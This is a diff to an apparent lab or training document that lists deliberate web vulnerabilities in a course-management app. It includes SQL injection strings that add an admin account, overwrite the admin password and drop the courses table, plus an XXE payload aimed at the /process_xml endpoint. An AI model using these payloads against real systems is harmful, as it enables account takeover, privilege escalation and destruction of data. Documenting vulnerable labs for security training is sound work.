@@ -33,18 +33,22 @@ Resources: [Sqli CheatSheet](https://book.hacktricks.xyz/pentesting-web/sql-inje
 cur.execute("SELECT user_id, role FROM users WHERE username = %s AND password = %s", (username, password))
 ```
 
-#### Insert/Update/Delete Data
+#### Insert/Update/Drop Data
 **Examples**
 Path: `/add_course`
 Methods: `GET, POST`
 
-*Note:* You must select instructor and set image_path for this to work.
+*Note:* Must be **Instructor/Admin** role and you must select instructor and set image_path for this to work properly.
 ```
-# In title section (Add new admin user)
-New Course', 'Malicious Description', 1, 'image.jpg'); INSERT INTO users (username, password, role) VALUES ('evil', 'evil', 'admin'); --
+# Insert new admin user
+New Course', 'Malicious Description', NULL, 'image.jpg'); INSERT INTO users (username, password, role) VALUES ('evil', 'evil', 'admin'); --
 
 # Update admin password
-New Course', 'test', 1, 'test.jpg'); UPDATE users SET password = 'testing' WHERE username = 'admin'; --
+New Course', 'test', NULL, 'test.jpg'); UPDATE users SET password = 'testing' WHERE username = 'admin'; --
+
+# Drop table
+New Course', 'test', NULL, 'test.jpg'); DROP TABLE courses CASCADE; --
+
 ```
 
 #### RCE Via SQL Injection (Postgresql)
@@ -88,7 +92,6 @@ Path: `/process_xml`
 Methods: `POST`
 
 **Example**
-- On `/add_course` XML Section
 ```
 <!DOCTYPE foo [
     <!ELEMENT foo ANY >
@@ -96,8 +99,7 @@ Methods: `POST`
 ]>
 <root>
    <title>Test Title</title>
-    <description>Test Description</description>
-    <image_path>&xxe;</image_path>
+    <description>&xxe;</description>
 </root>
 ```
 
